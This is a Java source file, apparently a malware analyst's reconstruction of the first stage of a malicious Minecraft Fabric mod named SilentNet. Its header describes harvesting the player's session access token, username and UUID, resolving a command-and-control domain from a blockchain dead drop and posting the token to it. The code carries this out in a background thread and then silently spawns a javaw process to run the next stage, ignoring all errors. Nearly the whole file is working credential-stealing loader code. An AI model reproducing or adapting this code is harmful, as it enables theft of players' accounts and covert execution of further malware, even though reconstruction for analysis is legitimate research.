package silentnet.stage1;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

/**
 * Reconstructed from net.fabric.tFixfrmuk.
 *
 * In the original this implements net.fabricmc.api.ModInitializer and is named
 * as the mod entrypoint in fabric.mod.json. Fabric calls onInitialize() while
 * Minecraft is starting. The loader immediately leaves the game thread.
 *
 * Flow:
 *   harvest access token / username / UUID from the live Minecraft session
 *   resolve the C2 domain from the Polygon dead drop
 *   POST the token to /shard/prefireMc and read prefireId
 *   base64 the mcInfo object and the whole context
 *   spawn javaw.exe -cp <jar> net.fabric.hyte <base64-context>
 */
public final class FabricEntrypoint {
    private FabricEntrypoint() {
    }

    /**
     * Original signature: public void onInitialize() implements ModInitializer.
     * The interface is omitted here so the reconstruction compiles without
     * Fabric on the classpath.
     */
    public void onInitialize() {
        Thread worker = new Thread(this::bootstrap, "SilentNet-Stage1");
        worker.start();
    }

    private void bootstrap() {
        try {
            String accessToken = SessionHarvester.accessToken();
            String username = SessionHarvester.username();
            String uuid = SessionHarvester.uuid();
            if (uuid == null) {
                uuid = "unknown";
            }

            String userId = Stage1Loader.defaultUserId();
            String tag = Stage1Loader.defaultTag();
            Path gameDir = findGameDir();

            Stage1Loader loader = new Stage1Loader();
            String domain = loader.getDomain();
            String prefireId = loader.prefire(domain, accessToken, userId);

            String mcInfoJson = "{"
                    + "\"username\":\"" + Json.escape(username) + "\","
                    + "\"uuid\":\"" + Json.escape(uuid) + "\","
                    + "\"accessToken\":\"" + Json.escape(accessToken) + "\""
                    + "}";
            String mcInfo = Base64.getEncoder()
                    .encodeToString(mcInfoJson.getBytes(StandardCharsets.UTF_8));

            // The original appends prefireId without escaping. It is expected to
            // be a UUID supplied by the C2; keeping the raw append preserves the
            // wire format (including the literal "null" fallback).
            String context = "{"
                    + "\"mcInfo\":\"" + mcInfo + "\","
                    + "\"prefireId\":\"" + (prefireId == null ? "null" : prefireId) + "\","
                    + "\"userId\":\"" + Json.escape(userId) + "\","
                    + "\"tag\":\"" + Json.escape(tag) + "\","
                    + "\"domain\":\"" + Json.escape(domain) + "\","
                    + "\"gameDir\":\"" + Json.escape(gameDir == null ? "" : gameDir.toString()) + "\","
                    + "\"mcUsername\":\"" + Json.escape(username) + "\","
                    + "\"mcUuid\":\"" + Json.escape(uuid) + "\","
                    + "\"env\":\"Fabric\""
                    + "}";
            String encoded = Base64.getEncoder()
                    .encodeToString(context.getBytes(StandardCharsets.UTF_8));

            Path workDir = Stage1Launcher.defaultWorkDir();
            Files.createDirectories(workDir);

            String javaw = javaExecutable().toString();
            String jarPath = new File(FabricEntrypoint.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getAbsolutePath();

            ProcessBuilder pb = new ProcessBuilder(
                    javaw,
                    "-cp", jarPath,
                    Stage1Loader.class.getName(),
                    encoded);
            pb.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(
                    workDir.resolve("_spawn.log").toFile()));
            pb.redirectErrorStream(true);
            pb.directory(workDir.toFile());
            pb.start();
        } catch (Exception ignored) {
            // The original catches every failure and does not surface it to Fabric.
        }
    }

    /**
     * Reconstructed from tFixfrmuk.tjnyb_vykcq_hnkb_ycqt().
     *
     * Prefer the current working directory when it looks like a Minecraft
     * instance, then %APPDATA%\.minecraft, then %USERPROFILE%\.minecraft, and
     * finally the current working directory.
     */
    private static Path findGameDir() {
        Path cwd = Path.of(System.getProperty("user.dir"));
        if (Files.exists(cwd.resolve("options.txt"))
                || Files.exists(cwd.resolve("config"))
                || Files.exists(cwd.resolve("mods"))) {
            return cwd;
        }

        String appData = System.getenv("APPDATA");
        if (appData != null) {
            Path minecraft = Path.of(appData, ".minecraft");
            if (Files.exists(minecraft)) {
                return minecraft;
            }
        }

        Path homeMinecraft = Path.of(System.getProperty("user.home"), ".minecraft");
        if (Files.exists(homeMinecraft)) {
            return homeMinecraft;
        }

        return cwd;
    }

    private static Path javaExecutable() {
        String javaHome = System.getProperty("java.home");
        Path javaw = Path.of(javaHome, "bin", "javaw.exe");
        if (Files.exists(javaw)) {
            return javaw;
        }
        return Path.of(javaHome, "bin", "java.exe");
    }
}
